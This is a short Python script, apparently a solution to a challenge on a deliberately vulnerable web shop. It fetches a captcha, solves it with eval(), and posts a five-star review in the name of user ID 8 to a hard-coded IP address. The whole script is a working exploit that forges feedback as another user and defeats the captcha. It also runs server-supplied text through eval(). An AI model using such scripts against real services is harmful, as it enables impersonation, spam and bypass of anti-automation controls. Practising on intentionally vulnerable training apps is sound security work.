import json

import requests

s = requests.Session()

r = s.get('http://43.241.202.47:3003/rest/captcha/')
response = json.loads(r.text)
data = json.dumps({
    "UserId": 8,
    "captcha": str(eval(response['captcha'])),
    "comment": "I'm not Homer!",
    "rating": 5,
    "captchaId": str(response['captchaId'])
})
r = s.post(
    'http://43.241.202.47:3003/api/Feedbacks/',
    data=data,
    headers={'Content-type': 'application/json'},
)
print("Data:", data)
print("Status code:", r.status_code)
